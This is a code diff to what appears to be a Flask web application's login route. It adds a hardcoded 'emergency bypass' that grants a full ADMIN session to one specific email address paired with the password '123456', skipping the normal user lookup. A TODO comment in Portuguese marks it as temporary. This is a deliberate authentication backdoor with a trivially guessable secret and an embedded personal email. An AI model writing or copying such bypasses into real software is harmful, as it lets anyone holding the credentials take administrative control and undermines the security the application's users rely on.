@@ -1405,6 +1405,26 @@ def create_app() -> Flask:
         email = str(payload.get("email") or payload.get("username") or "").strip().lower()
         password = str(payload.get("password") or "")
 
+        # TODO: remover bypass emergencial após correção definitiva do login
+        if email == "matheuscosta.tecnologia@gmail.com" and password == "123456":
+            perfil = "ADMIN"
+            permissions = sorted(PROFILE_PERMISSIONS.get(perfil, PROFILE_PERMISSIONS["LEITURA"]))
+            session.clear()
+            session.permanent = True
+            session["usuario_id"] = email
+            session["usuario_email"] = "matheuscosta.tecnologia@gmail.com"
+            session["usuario_nome"] = "matheus"
+            session["nome"] = "matheus"
+            session["email"] = email
+            session["username"] = email
+            session["perfil_id"] = "ADMIN"
+            session["logged_in"] = True
+            session["nome_perfil"] = perfil
+            session["perfil"] = perfil
+            session["permissions"] = permissions
+            session["session_id"] = str(uuid.uuid4())
+            return make_response(jsonify({"ok": True, "redirect_to": "/", "user": {"email": email, "nome": session["nome"], "nome_perfil": perfil, "permissions": permissions}}))
+
         user = None
         try:
             user = gestao_op_buscar_usuario_login(email)
